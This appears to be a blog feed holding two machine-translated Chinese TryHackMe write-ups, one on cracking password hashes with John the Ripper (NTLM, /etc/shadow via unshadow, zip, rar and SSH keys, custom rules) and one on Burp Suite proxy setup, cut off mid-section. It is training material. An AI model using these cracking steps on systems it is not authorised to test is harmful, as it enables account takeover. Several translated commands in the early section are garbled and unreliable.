在Parrot、Kali和TryHackMe的AttackBox上，你可以在/usr/share/wordlists目录下找到一系列惊人的单词列表。 rockyou 对于这个房间里的所有任务，我们将使用臭名昭著的rockyou.txt单词列表——这是一个非常大的普通密码单词列表，是从2009年rockyou.com网站的数据泄露中获得的。如果您没有使用上述任何一个发行版，您可以从/Passwords/ leaks - databases小节下的SecLists存储库中获取rock .txt wordlist。您可能需要从.tar.gz格式中提取它，使用tar xvzf rock .txt.tar.gz。 现在我们已经把哈希破解器和单词列表都设置好了，让我们开始一些哈希破解吧! 破解基本哈希 破解基本哈希 有多种方法可以使用开膛手约翰来破解简单的哈希，在我们继续自己破解一些哈希之前，我们将介绍一些方法。 基本语法 开膛手约翰命令的基本语法如下。我们将介绍使用它们时使用的特定选项和修饰符。 John [options][文件路径] 约翰-调用开膛手约翰程序 [path to file] -包含你试图破解的哈希值的文件，如果它在同一目录下，你不需要命名路径，只需要命名文件。 自动破解 John有内置功能来检测给定的哈希类型，并选择适当的规则和格式来为您破解它，这并不总是最好的主意，因为它可能不可靠-但如果您无法识别正在使用的哈希类型，只是想尝试破解它，这可能是一个不错的选择!要做到这一点，我们使用以下语法: John—wordlist=[到wordlist的路径][文件的路径] ——wordlist= -指定使用wordlist模式，从您在以下路径中提供的文件中读取… [path to wordlist] -您正在使用的单词列表的路径，如前一个任务中所述。 使用示例: John——wordlist=/usr/share/wordlists/rock .txt hash_to_crack.txt 识别散列 有时候John不能很好地自动识别和加载哈希值，这没关系!我们可以使用其他工具来识别散列，然后将john设置为使用特定格式。有多种方法可以做到这一点，例如使用像这样的在线散列标识符。我喜欢使用一个叫做hash-identifier的工具，这是一个非常容易使用的Python工具，它会告诉你输入的哈希可能是什么不同类型的哈希，如果第一个失败，它会给你更多的选择。 要使用哈希标识符，您可以使用:wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py从gitlab提取python文件。 然后简单地用python3 hash-id.py启动它，然后输入你想要识别的哈希值——它会给你可能的格式! 特定于格式的开裂 一旦你确定了你正在处理的哈希，你可以告诉john在使用下面的语法破解提供的哈希时使用它: ——format=[format]——wordlist=[到wordlist的路径][到文件的路径] ——format=——这是一个标志，告诉John你给了它一个特定格式的散列，并使用下面的格式来破解它 [format] -哈希值的格式 使用示例: ——format=raw-md5——wordlist=/usr/share/wordlists/rock .txt hash_to_crack.txt 格式说明: 当你告诉john使用格式时，如果你处理的是标准哈希类型，比如上面例子中的md5，你必须给它加上前缀withi——告诉john你处理的是标准哈希类型，尽管这并不总是适用。要检查是否需要添加前缀，您可以使用John——list=formats列出John的所有格式，然后手动检查，或者使用John——list=formats | grep -iF &quot;md5&quot;之类的命令grep查找您的哈希类型。 实用 现在您已经了解了破解基本哈希的语法、修饰符和方法，您可以自己尝试一下!下载附带的.txt文件 破解Windows身份验证哈希 打碎窗户 现在我们了解了开膛手约翰的基本语法和用法，让我们继续破解一些更困难的东西，如果你在进行真正的渗透测试或红队参与，你甚至可能想尝试一下。身份验证散列是操作系统存储的密码的散列版本，有时可以使用我们正在使用的暴力破解方法来破解它们。要获得这些散列，您通常必须已经是一个特权用户—因此我们将在尝试时解释我们计划破解的一些散列。 NTHash / NTLM NThash是现代Windows操作系统机器存储用户和服务密码的哈希格式。它通常也被称为“NTLM”，它引用了以前版本的Windows格式的散列密码，称为“LM”，因此是“NT/LM”。 稍微回顾一下历史，Windows产品的NT名称最初意味着“新技术（New Technology）”，并且从Windows NT开始，用于表示不是基于MS-DOS操作系统构建的产品。最终，“NT”系列成为微软发布的标准操作系统类型，这个名字被删除了，但它仍然存在于一些微软技术的名称中。 可以通过将SAM数据库转储到Windows机器上、使用Mimikatz之类的工具或从Active Directory数据库NTDS.dit获取NTHash/NTLM哈希值。您可能不必破解哈希来继续特权升级—因为您通常可以执行“传递哈希”攻击，但如果存在弱密码策略，有时破解哈希是一个可行的选择。 实用 现在您已经了解了它背后的理论，看看您是否可以使用我们在上一个任务中练习的技术，以及这是什么类型的散列来破解ntlm.txt文件! 破解/etc/shadow哈希 从/etc/shadow 中破解散列 etc/shadow 文件是 Linux 机器上存储密码哈希的文件，它还会存储其他信息，如上次密码更改日期和密码过期信息，shadow文件的每一行都为系统的每个用户或用户帐户包含一个条目。 这个文件通常只有 root 用户才能访问——因此，为了获得文件的哈希值，你必须拥有足够的特权，你才有机会破解一些哈希值。 Unshadowing（去除shadow） John 对于需要使用的数据格式有一定要求，所以为了破解/etc/shadow密码你必须将/etc/shadow与/etc/passwd 文件组合起来，以便 John 能够理解所给出的数据。为此，我们需要使用一个内置在 John 工具套件中的名为 unshadow 的工具。unshadow 的基本语法如下: unshadow [path to passwd] [path to shadow] unshadow 调用 unshadow 工具 [path to passwd] 包含从目标计算机获取的/etc/passwd 文件副本的文件路径 [path to shadow] 包含从目标计算机获取的/etc/shadow 文件副本的文件路径 示例用法: unshadow local_passwd local_shadow &gt; unshadowed.txt 注意： 在使用 unshadow 时，你可以使用完整的/etc/passwd 和/etc/shadow 文件——如果它们可用的话，也可以使用每个文件中的相关行，例如: FILE 1 - local_passwd 包含 root 用户的/etc/passwd 行: root:x:0:0::/root:/bin/bash FILE 2 - local_shadow 包含 root 用户的/etc/shadow 行: root:$6$2nwjN454g.dv4HN/$m9Z/r2xVfweYVkrr.v5Ft8Ws3/YYksfNwq96UL1FX0OJjY1L6l.DS3KEVsZ9rOVLB/ldTeEL/OIhJZ4GMFMGA0:18576:::::: 在完成unshadow处理之后，我们将 unshadow 的输出直接提供给 John，在我们的示例中 这个输出结果被称为“ unshadowed. txt”。 我们不需要在这里指定哈希格式，因为我们已经专门为 John 做了输入处理（使用unshadow处理），但是在某些情况下，你仍然需要指定哈希格式: --format=sha512crypt john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt Single Crack Mode single模式简介 john还有另一种模式，叫做single破解模式。在这种模式下，john 只使用用户名中提供的信息，通过稍微更改用户名中包含的字母和数字（字词混淆），试探性地计算出可能的密码值。 字词混淆 要展示什么是single破解模式，什么是字词混淆，最好的方法是通过一个实际的例子: 如果用户名是 Markus 那么一些可能的密码可以是: Markus1, Markus2, Markus3 MArkus, MARkus, MARKus Markus!, Markus$, Markus* ...... 这种技巧被称为字词混淆，在这个过程中，John 正在建立一个自己的字典，这个字典是基于它接收到的信息所建立的，并且使用了一系列“混淆规则”，这些规则定义了它如何根据你想要破解的目标的相关因素来变异它开始的单词，进而生成一个字典。这是对弱密码生成策略的一种利用，因为很多弱密码都是基于用户名信息，或者用户所登录的服务而产生。 GECOS John 实现的字词混淆处理还具有与 UNIX 操作系统（以及其他类 UNIX 操作系统，如 Linux）的 Gecos 字段兼容的特性。 那么，什么是 Gecos？还记得在上文中我们提到的/etc/shadow 和/etc/passwd 的数据条目吗？ 如果你仔细看，你会发现shadow文件和passwd文件中的每个字段都用冒号&quot;:&quot; 分隔，这些记录被分割成的每一个字段都称为 Gecos 字段。 John 可以将存储在这些记录中的信息，比如全名和主目录名等信息，添加到它用single模式破解/etc/shadow哈希时 生成的字符串中。 使用single模式 如果我们要破解用户名为Mike的密码，我们使用的语法如下： john --single --format=[format] [path to file] --single 这个标志让 john 知道你想使用单破解模式。 示例用法: john --single --format=raw-sha256 hashes.txt 注意：如果你想在单破解模式下破解哈希，那么你需要更改提供给 john 的文件内容，以便john理解 根据哪些数据开始创建字典，为此，你可以将哈希文件所属的用户名添加到哈希值开头，根据上面的示例，我们将更改文件 hashes.txt 从 1efee03cdcb96d90ad48ccc7b8666033 改为 mike:1efee03cdcb96d90ad48ccc7b8666033 自定义规则 理论 什么是自定义规则？ 在我们探索 John的单破解模式能做什么的过程中——你可能会有一些关于什么是适合的破解模式的想法，或者你的密码经常使用什么哈希模式加密——这些想法可以通过某种破解模式来复制。你可以定义自己的规则集，John将使用这些规则来动态创建密码。当你足够了解关于你的目标密码结构的信息时，自定义规则非常有用。 通用的自定义规则 许多组织需要一定程度的密码复杂性来对抗字典攻击，也就是说，如果你在某个地方创建了一个帐户，你可以创建一个密码并输入： polopassword（此处是举例） 然后你就可能会收到一个提示，告诉你密码必须至少包含以下内容之一: 大写字母 数字 符号 我们可以利用这样一个规则，即大多数用户在这些字符的输入位置上是可以预测的。对于上述密码标准要求，许多用户可能会使用以下内容: Polopassword1! 密码首先是大写字母，最后是一个数字和一个符号，这种熟悉的密码模式，由修饰词(如大写字母或符号)附加和预置，是人们在创建密码时经常会使用和重用的令人难忘的模式。这种模式可以让我们利用密码复杂性的可预测性：从我们的字典中创建动态密码来进行密码破解。 如何创建自定义规则 自定义规则可以在john.conf配置文件中定义，通常路径是/etc/john/john.conf，如果你已经使用包管理器安装了 John，或者使用 make 从源代码构建了John，那么你可以直接在刚才提及的路径下找到并查看john.conf文件。 让我们了解一下这些自定义规则的语法： 第一行: [List.Rules:THMRules] 用于定义自定义规则的名称，就是你将用来作为 John 参数调用自定义规则的名称。 然后，我们使用正则表达式模式匹配来定义字词中的哪些地方将被修改，我们在这里只讨论基本的和最常见的修饰符: Az 获取原密码单词并将你定义的字符附加在其后面 A0 获取原密码单词并将你定义的字符前置在其前面 c 使用大写字母 这些修饰符可以结合使用来定义你要修改的原密码单词的位置和内容。 最后，我们要定义哪些字符应该被附加或者前置，我们通过在方括号中添加字符集来实现这一点，而且[ ]要放在&quot; &quot;里面，下面是一些常见的例子: [0-9] 包括0-9数字 [0] 只包括数字0 [A-z] 包括大写和小写字母 [A-Z] 只包括大写字母 [a-z] 只包括小写字母 [a] 只包括字母a [!£$%@] 包括特殊符号!£$%@ 将我们需要的修饰符放在一起，以便根据与示例密码“Polopassword1!”匹配的规则来生成一个新的单词列表(假设初始密码单词polopassword在我们的原单词列表中，我们将基于原单词列表进行扩展)，我们可以创建一个如下所示的规则条目: [List.Rules:PoloPassword] cAz&quot;[0-9] [!£$%@]&quot; #c 表示把第一个字母大写 #Az 表示附加到原密码单词的末尾 #[0-9] 表示0-9范围内的一个数字 #[!£$%@] 表示在刚才的数字后面跟着一个特殊符号(指定范围内的符号) 使用自定义规则 我们现在可以使用--rule=PoloPassword参数选项来应用自定义规则并扩展原单词列表，最终我们将得到一个新的单词列表： john --wordlist=[path to wordlist] --rule=PoloPassword [path to file] 注意：Jumbo John已经提供了包含许多密码规则的集合，对应着很多可以选择的修饰符组合；如果某个规则的语法无法正常工作，请尝试查看john.conf文件的第696行以后的List.Rules部分内容。 破解受密码保护的Zip压缩文件 理论 我们可以用 John 破解密码保护的 Zip 文件：首先使用 John 工具套件的一个独立部分能将 zip 文件转换成 John 能够理解的格式（提取hash值），然后再进行破解。 zip2john 与我们之前使用的 unshadow 工具类似，我们将使用 zip2john 工具将 zip 文件转换为 John 能够理解的哈希格式（提取hash值），zip2john 的基本用法是这样的： zip2john [options] [zip file] &gt; [output file] [options] 允许你向 zip2john 传递特定的校验和选项，这通常是不必要的 [zip file] 希望提取hash值的zip文件的路径 &gt; 这是输出指示器，我们用它来将这个文件的输出发送到..。 [output file] 这个文件将存储输出结果 示例用法 zip2john zipfile.zip &gt; zip_hash.txt 开始破解 使用了zip2john之后，我们就能够在示例中获取从 zip2john 输出的名为“ zip _ hash.txt”的文件，正如我们使用 unshadow 所做的那样，我们将“ zip _ hash.txt”直接提供给 john，因为我们已经为该文件做了输入格式的处理： john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt 破解受密码保护的 RAR 归档文件 理论 我们可以使用与上一小节中类似的过程来破解rar归档文件的密码。 rar 归档文件是由 Winrar 归档管理器创建的压缩文件，和zip一样，rar可以作为各种各样的文件夹和文件的压缩格式。 rar2john rar2john几乎与我们刚才使用的 zip2john 工具相同，我们可以使用 rar2john 工具将 rar 文件转换为john能够理解的hash格式（提取hash值）。基本语法如下: rar2john [rar file] &gt; [output file] rar2john 调用 rar2john 工具 [rar file] 想要提取hash值的rar文件的路径 &gt; 这是输出指示器，我们用它来将这个文件的输出发送到..。 [output file] 这是存储输出结果的文件 示例用法 rar2john rarfile.rar &gt; rar_hash.txt 开始破解 使用了rar2john之后，我们就能够在示例中获取从 rar2john输出的名为“ rar _ hash.txt”的文件，我们将“ zip _ hash.txt”直接提供给 john，因为我们已经为该文件做了输入格式的处理： john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt 使用john破解SSH密钥 理论 破解 SSH 密码 使用 John 可以破解id _ rsa文件的SSH 私钥密码。除非另外配置，否则你将使用密码对 SSH 登录进行身份验证。你可以配置基于密钥的身份验证，这使你可以使用你的私钥id _ rsa作为通过 SSH 登录到远程计算机的身份验证密钥。但是，这样做通常需要设置一个密码------在这里，我们将使用 john 来破解这个密码，以允许我们通过 SSH 使用密钥进行身份验证。 ssh2john ssh2john 可以将用于登录到 SSH 会话的id _ rsa 私钥转换为 john能够识别的hash格式（提取hash值），使用语法如下： ssh2john [id_rsa private key file] &gt; [output file] [id_rsa private key file] 希望提取hash值的id_rsa文件的路径 &gt; 这是输出指示器，我们用它来将这个文件的输出发送到..。 [output file] 这是存储输出结果的文件 示例用法 ssh2john id_rsa &gt; id_rsa_hash.txt 开始破解 使用了ssh2john之后，我们就能够在示例中获取从 ssh2john输出的名为“id_rsa_hash.txt”的文件，我们将“ id_rsa_hash.txt”直接提供给 john，因为我们已经为该文件做了输入格式的处理： john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt ","link":"https://f9f.fun/post/thm-john-the-ripper/"},{"title":"Tryhackme-Burp Suite: The Basics","content":"Tryhackme-Burp Suite: The Basics 介绍大纲 欢迎使用Burp suite基础知识! 这个房间将涵盖使用Burp Suite web应用程序框架的基础。 具体来说，我们将关注: 什么是Burp Suite 框架中可用工具的概述 为自己安装Burp Suite 导航和配置打嗝套件。 我们还将介绍Burp Suite框架的核心:Burp Proxy。这个房间主要是为了提供Burp套件的基础知识，然后可以在Burp模块的其他房间进一步建立;因此，从理论上讲，它将比后续的房间重得多，后者采取了更实用的方法。如果您以前没有使用过Burp Suite，建议您阅读此处的信息并使用该工具的副本。实验是关键:将这些信息与自己的应用程序一起使用，为使用框架建立基础，然后可以在以后的房间中构建。 让我们开始吧! 什么是Burp Suite? 简而言之:Burp Suite是一个用Java编写的框架，旨在为web应用程序渗透测试提供一站式服务。在许多方面，这个目标都实现了，因为Burp是一个非常实用的web应用程序安全评估的行业标准工具。Burp Suite在评估移动应用程序时也非常常用，因为同样的特性使得它对web应用程序测试如此有吸引力，几乎完美地转化为测试大多数移动应用程序的api(应用程序编程接口)。 在最简单的层面上，Burp可以捕获和操纵攻击者和web服务器之间的所有流量:这是框架的核心。在捕获请求之后，我们可以选择将它们发送到Burp Suite框架的各个其他部分——我们将在接下来的房间中介绍其中的一些工具。这种在web请求发送到目标服务器之前(或者，在某些情况下，在浏览器接收到响应之前)拦截、查看和修改web请求的能力，使Burp Suite非常适合任何类型的手动web应用程序测试。 有各种不同版本的Burp Suite可用。我们将使用Burp Suite社区版，因为它可以免费用于任何(合法的)非商业用途。Burp Suite专业版和企业版都需要昂贵的许可证，但具有强大的额外功能: Burp Suite Professional是Burp Suite Community的无限制版本。它具有以下功能: 自动漏洞扫描器 一个没有速率限制的模糊器/暴力器 保存项目以备将来使用;报告生成 内置API，允许与其他工具集成 不受限制地添加新扩展以获得更大的功能 访问Burp Suite协作器(有效地提供自托管或运行在Portswigger拥有的服务器上的唯一请求捕获器) 简而言之，Burp Pro是一个非常强大的工具，这就是为什么它的一年订阅价格为每位用户319英镑(399美元)。由于这个原因，Burp Pro通常只有专业人士使用(通常由雇主提供许可证)。 Burp Suite Enterprise略有不同。与社区版和专业版不同，Burp企业版用于连续扫描。它提供了一个自动扫描器，可以定期扫描web应用程序的漏洞，就像Nessus这样的软件执行自动基础设施扫描一样。不同于其他版本的Burp Suite允许你在自己的电脑上执行手动攻击，Enterprise位于服务器上，并不断扫描目标web应用程序的漏洞。 由于这两个版本的Burp Suite的成本过高，我们将坚持使用Burp Suite社区提供的核心功能集。 注意:Burp Suite for Windows在许多演示的截图中都有特色;但是，这与安装在攻击箱上的Burp套件副本之间没有区别。 Burp Community的特点 虽然与专业版相比，Burp Community的功能相对有限，但它仍然有许多出色的工具可用。这些包括: Proxy:Burp Suite最著名的方面，Burp代理允许我们在与web应用程序交互时拦截和修改请求/响应。 Repeater:第二个最著名的Burp特性——Repeater——允许我们捕获、修改，然后多次重新发送相同的请求。这个特性绝对是无价的，特别是当我们需要通过试验和错误来制作有效负载时(例如在SQLi—结构化查询语言注入中)，或者在测试端点的功能缺陷时。 **Intruder:**尽管Burp Community严格限制速率，但入侵者允许我们向端点喷射请求。这通常用于暴力攻击或模糊端点。 **Decoder:**尽管与前面提到的特性相比，Decoder使用较少，但在转换数据时仍然提供了有价值的服务——无论是解码捕获的信息，还是在将有效负载发送到目标之前对其进行编码。虽然还有其他服务可以做同样的工作，但在Burp Suite中直接完成这项工作可能非常有效。 Comparer: 顾名思义，Comparer允许我们在字或字节级别比较两个数据块。同样，这不是Burp Suite独有的功能，但是能够通过一个快捷键将(可能非常大的)数据直接发送到比较工具中可以大大加快速度。 Sequencer: 我们通常在评估令牌的随机性时使用Sequencer，例如会话cookie值或其他随机生成的数据。如果算法不能生成安全的随机值，那么这可能会为攻击开辟一些毁灭性的途径。 除了大量的内置特性之外，Java代码库还使编写扩展以添加到Burp框架的功能中变得非常容易。它们可以用Java、Python(使用Java Jython解释器)或Ruby(使用Java JRuby解释器)编写。Burp Suite Extender模块可以快速轻松地将扩展加载到框架中，并提供一个下载第三方模块的市场(称为“BApp Store”)。虽然许多这些扩展需要专业的许可证才能下载和添加，但仍然有相当数量的扩展可以与Burp社区集成。例如，我们可能希望使用Logger++模块扩展Burp Suite的内置日志记录功能。 安装 Burp Suite是一个非常有用的工具，无论你是明确地评估一个web或移动应用程序的测试/bug赏钱，还是只是想调试你正在开发的web应用程序中的一个新功能。因此，了解如何在各种平台上安装Burp Suite非常重要，而不仅仅是在Kali或Parrot等渗透测试操作系统中使用它。你永远不知道什么时候你可能需要它! 幸运的是，PortSwigger已经使得在Linux、macOS和Windows上安装Burp Suite非常容易，为这三种系统都提供了专门的安装程序。作为一个Java应用程序，Burp也可以作为JAR归档文件下载，并有效地运行在任何支持Java运行时环境的设备上。 Burp Suite是预先打包在Kali Linux中的，所以您不需要在那里安装它。如果由于某种原因，您的Kali安装中缺少Burp，您可以轻松地从Kali apt存储库中安装它。 对于其他系统，我们可以从Burp Suite Downloads page. 从下拉菜单中，我们可以选择我们的操作系统，以及我们是想要Burp Suite Community还是Burp Suite Professional: 然后我们可以点击“下载”按钮开始下载Burp套件安装程序。无论您使用的是哪个操作系统，都要确保使用Burp Suite Community Edition。 一旦我们验证了下载的完整性，我们就可以在我们的操作系统中以正常的方式安装它(例如在Windows中运行可执行文件或在Linux中使用sudo从终端执行脚本)。 注意:如果在Linux中安装，您可以选择使用或不使用超级用户权限进行安装。如果您决定在执行脚本时不使用sudo, BurpSuite将安装在您的主目录~/ burpsuitecomcommunity / burpsuitecomcommunity中，而不会添加到您的PATH中。 安装向导非常直观。不管你的操作系统是什么，接受建议的默认值通常是安全的;但是，仔细阅读安装程序仍然是明智的。 安装了Burp Suite后，我们现在可以启动应用程序了。我们第一次使用它时，Burp Suite会要求我们阅读并接受其条款和条件;在接受或拒绝他们之前，一定要做到这一点! 接受了条款和条件后，我们看到了另一份菜单。我们将在下一个任务中讨论这个问题。 仪表板 当我们打开Burp Suite并接受条款和条件时，我们会遇到一个窗口，要求我们选择项目类型。 这个窗口在Burp社区没有给我们很多选择。Burp Pro允许我们将工作保存到磁盘上，或者在此时加载以前保存的项目。然而，我们在这里所能做的就是点击“下一步”。 下一个窗口允许我们选择Burp Suite的配置。在大多数情况下，保持默认值是完美的: 点击“start burp”，burp suite界面将打开! 当你第一次打开Burp Suite时，你可能会看到一个训练选项的屏幕。如果你有时间，这些都值得一读。 如果没有(在任何后续的会议中)，你将会看到一个稍微令人生畏的burp仪表板: 如果这还不太有意义，不要惊慌——很快就会有意义的! 简而言之，Dashboard界面分为四个象限: 1.任务菜单允许我们定义在使用应用程序时Burp Suite将运行的后台任务。专业版还允许我们创建按需扫描。默认的“动态被动抓取”(自动记录我们访问的页面)将更适合我们在这个模块中的使用。 2.事件日志告诉我们Burp Suite正在做什么(例如启动代理)，以及我们通过Burp建立的任何连接的信息 3.问题活动部分是Burp Pro独有的。它不会给我们任何使用Burp社区的信息，但在Burp专业版中，它会列出自动扫描器发现的所有漏洞。这些将根据严重程度进行排序，并根据Burp确定组件易受攻击的程度进行过滤。 4.咨询部分提供了关于发现的漏洞的更多信息，以及参考和建议的补救措施。然后可以将这些导出到报告中。 点击“问题活动”部分中的一个示例漏洞，我们就可以了解它是什么样子的: 在Burp Suite的各个选项卡和窗口中，你会发现一些小的帮助图标:一个圆圈内的问号。 点击这些将会打开一个包含该部分帮助的新窗口，例如: 如果你被困住了，不知道一个功能是做什么的时候，这些功能是非常有用的，所以要好好利用它们! 导航 默认情况下，Burp Suite GUI的导航完全使用顶部菜单栏完成: 这些允许您在模块之间切换(沿着附加图像的顶部行)。如果所选模块有多个子选项卡，那么可以使用第二个菜单栏来选择这些子选项卡，该菜单栏直接出现在原始栏的下方(上图的底部行)。通常在这些子选项卡中提供特定于模块的设置(就像上面的代理选项一样)。 如果您喜欢单独查看多个选项卡，选项卡也可以弹出到单独的窗口中。这可以通过点击屏幕顶部应用程序菜单中的“窗口”，然后选择“分离”选项卡来完成: 这些可以以同样的方式重新连接。 除了菜单栏，Burp Suite还有键盘快捷键，可以快速导航到关键选项卡。默认情况下，它们是: 我们将在下一个任务中了解如何查看和更改这些内容。 选项 在我们开始学习Burp Proxy之前，让我们看一下配置Burp Suite可用的选项。 有两种类型的设置:全局设置(也称为用户设置)和项目设置。 用户设置会影响整个Burp Suite的安装，并且会在每次启动应用程序时应用。相比之下，“项目设置”仅适用于当前项目。鉴于我们不能在Burp Suite Community Edition中保存项目，这实际上意味着每次关闭Burp时，我们设置的任何项目选项都将丢失。 许多选项都作为全局设置(用于设置基线)和项目设置(可用于覆盖等效的全局设置)提供。 注意:Burp套件的设置系统最近被彻底修改了。已更新为使用新版本。请确保您使用的是最新版本的Burp Suite。 点击顶部导航栏的“设置”按钮可以进入设置窗口: 在左侧，我们有一个菜单，其中包含更改所有设置，用户设置和项目设置之间的范围的选项，以及搜索特定设置，或按类别选择它们。 值得注意的是，Burp Suite中的许多工具都提供了特定类别设置的快捷方式。例如，代理工具包括一个“代理设置”按钮，它将打开设置窗口直接到与代理相关的部分。 Burp 代理介绍 Burp Proxy是Burp Suite中最基本(也是最重要的!)的可用工具。它允许我们捕获自己和目标之间的请求和响应。然后可以对其进行操作或将其发送到其他工具进行进一步处理，然后再允许其继续到达目的地。 例如，如果我们通过Burp Proxy向https://tryhackme.com发出请求，我们的请求将被捕获，并且不允许继续到TryHackMe服务器，直到我们明确允许它通过。我们可以选择对来自服务器的响应执行相同的操作，尽管默认情况下这不是活动的。这种拦截请求的能力最终意味着我们可以完全控制我们的网络流量——当涉及到测试web应用程序时，这是一种非常宝贵的能力。 在使用代理之前，我们需要进行一些配置，但让我们从接口开始。 注意:您不需要遵循此任务—只需阅读信息并了解代理的用途。 当我们第一次打开代理选项卡时，Burp会给我们提供一堆有用的信息和背景阅读。这些信息非常值得一读;然而，真正的奇迹发生在我们捕获请求之后: 由于代理处于活动状态，向TryHackMe网站发出了请求。此时，发出请求的浏览器将挂起，请求将出现在Proxy选项卡中，给出上面截图所示的视图。然后我们可以选择转发或放弃请求(可能在编辑之后)。我们还可以在这里执行各种其他操作，例如将请求发送到其他Burp模块之一，将其复制为cURL命令，将其保存到文件中，以及许多其他操作。 当我们完成代理的工作时，我们可以点击“拦截是在”按钮来禁用拦截，这将允许请求通过代理而不被停止。 当拦截关闭时，Burp Suite仍将(默认情况下)记录通过代理发出的请求。这对于返回和分析先前的请求非常有用，即使我们在发出请求时没有特别捕获它们。 Burp还将捕获和记录WebSocket通信，这在分析web应用程序时非常有用。 日志可以通过“HTTP历史”和“WebSockets历史”子选项卡查看: 值得注意的是，这里捕获的任何请求都可以通过右键单击它们并选择“Send to…”发送到框架中的其他工具。例如，我们可以接收之前已经被代理到目标的HTTP请求，并将其发送到Repeater。 最后，还有代理特定的选项，在代理设置中，通过点击“代理设置”按钮可以访问。 这些选项使我们能够控制代理的操作方式，因此熟悉这些选项是一个很好的主意。 例如，默认情况下，代理不会拦截服务器响应，除非我们明确要求它以每个请求为基础。我们可以通过选择“基于以下规则拦截响应”复选框并选择一个或多个规则来覆盖默认设置。&quot;Or Request Was interception &quot;规则适用于捕获被代理截获的所有请求的响应: “And URL在目标范围内”是另一个很好的默认规则;我们稍后会在这个房间里讨论范围界定。 您可以为大多数代理选项制定自己的规则，因此在本节中，您可以四处查看并进行实验，这将非常有用! 这个子选项卡的另一个特别有用的部分是“匹配和替换”部分;这允许您对传入和传出的请求执行正则表达式。例如，您可以自动更改用户代理以在传出请求中模拟不同的web浏览器，或者删除在传入请求中设置的所有cookie。同样，您可以在这里自由地制定自己的规则。 通过代理连接(FoxyProxy) 你们已经见过这个理论;现在是时候开始为自己使用代理了。 有两种方法可以通过burp suite代理我们的流量。 1.我们可以使用嵌入式浏览器(我们将在后面的任务中介绍)。 2.我们可以配置本地web浏览器，通过Burp代理我们的流量;这是更常见的，因此将是本任务的重点。 Burp Proxy通过在127.0.0.1:8080(默认)上打开web接口来工作。正如这是一个“代理”这一事实所暗示的那样，在我们开始用Burp拦截它之前，我们需要将所有的浏览器流量重定向到这个端口。我们可以通过更改浏览器设置来实现这一点，或者更常见的是，通过使用一个名为FoxyProxy的Firefox浏览器扩展。FoxyProxy允许我们保存代理配置文件，这意味着我们可以快速，轻松地切换到我们的“打嗝套件”配置文件在点击的问题，然后禁用代理一样容易。 注意:所有的说明都是用Firefox给出的，因为这是Kali Linux和TryHackMe攻击箱的默认浏览器。如果您在本地使用其他浏览器，则建议您使用攻击箱，否则您可能需要找到替代本任务中提供的方法。如果您无法让代理在本地浏览器中工作，并且不想使用攻击箱，那么您可能希望跳到Burp Suite browser任务。 foxproxy有两个版本:Basic和Standard。这两个版本都允许您动态更改代理设置;但是，FoxyProxy标准可以让您对通过代理发送的流量有更多的控制。例如，它允许您设置模式匹配规则来确定请求是否应该被代理:这比FoxyProxy basic提供的简单代理更复杂。 基本版对我们的使用是绰绰有余的。它是预先安装和配置在Firefox浏览器的攻击箱，所以如果你使用的是攻击箱，请随意跳转到本任务的最后一部分。 如果您使用自己的机器，您可以在这里下载foxproxy Basic。 here. 安装后，屏幕右上方应该出现一个按钮，允许您访问代理配置: 没有默认配置，所以让我们点击“选项”按钮来创建我们的burp代理配置。 这将打开一个带有FoxyProxy选项页的新浏览器选项卡: 点击“添加”按钮，填写以下数值: 现在点击“保存”。 当你点击屏幕顶部的FoxyProxy图标时，你会看到Burp有一个可用的配置: 如果我们点击“Burp”配置，我们的浏览器将开始通过127.0.0.1:8080引导我们的所有流量。请注意:如果Burp Suite未运行，当此配置被激活时，您的浏览器将无法发出任何请求! 现在激活这个配置——菜单中的图标应该会改变，表明我们有一个代理正在运行: 接下来，切换到burp套件，并确保拦截是开启的: 现在，尝试在Firefox中访问http://10.10.198.138/的主页。您的浏览器应该挂起，您的代理将填充请求标头。 恭喜你，你拦截了你的第一个请求! 从这里开始，您可以选择转发或放弃请求。或者，您可以将其发送到另一个工具，或者通过右键单击请求并从右键菜单中选择一个选项来执行任意数量的其他操作。 请记住:当您连接到代理并打开代理拦截时，您的浏览器将在您发出请求时挂起。当你在学习使用Burp Suite时，一个很常见的错误是不小心打开了拦截开关，因此无法通过浏览器发出任何web请求。如果你的浏览器挂起了，你不知道为什么:检查你的代理! 代理HTTPS 很好，我们可以拦截HTTP通信了，下一步是什么? 不幸的是，有一个问题。如果我们浏览到启用了TLS的站点会发生什么?例如:https://google.com/: 我们得到一个错误。 具体来说，Firefox告诉我们Portswigger证书颁发机构(CA)没有授权保护连接。 幸运的是，Burp为我们提供了一个简单的方法。我们需要让Firefox信任由Portswigger证书保护的连接，因此我们将手动将CA证书添加到受信任的证书颁发机构列表中。 首先，用代理激活头到http://burp/cert;这将下载一个名为cacert.der的文件——将其保存在您的机器上。 接下来，在Firefox搜索栏中输入about:preferences，然后按回车键;这将把我们带到FireFox设置页面。页面中搜索“证书”，我们会找到“查看证书”的选项: 点击“查看证书”按钮，我们可以看到所有受信任的CA证书。我们可以为Portswigger注册一个新的证书，按“Import”并选择我们刚刚下载的文件。 在弹出的菜单中，选择“信任此CA以识别网站”，然后单击确定: 我们现在应该可以自由访问任何启用TLS的站点了! 以下视频展示了完整的导入过程: The Burp Suite 浏览器 如果最后几个任务看起来过于复杂，请放心，本主题将简单得多。 除了让我们可以选择修改我们的常规web浏览器以使用代理之外，Burp Suite还包括一个内置的Chromium浏览器，该浏览器预先配置为使用代理而无需我们刚才必须做的任何修改。 虽然这看起来很理想，但它并不像前面几个任务中详细介绍的过程那样常用。人们倾向于坚持使用自己的浏览器，因为它提供了更多的可定制性;然而，两者都是完全有效的选择。 我们可以通过代理选项卡中的“打开浏览器”按钮启动Burp浏览器: 现在将弹出一个Chromium窗口。我们在此所做的任何请求都将通过代理。 注意:在项目选项和用户选项选项卡中有许多与burp浏览器有关的设置-确保去看看它们! 如果我们以root用户在Linux上运行(就像我们使用AttackBox一样)，Burp Suite无法创建一个沙盒环境来启动Burp浏览器，导致它抛出错误并死亡: 有两个简单的解决方案: 1.明智的选择是:我们可以创建一个新用户，并在低权限帐户下运行Burp Suite。 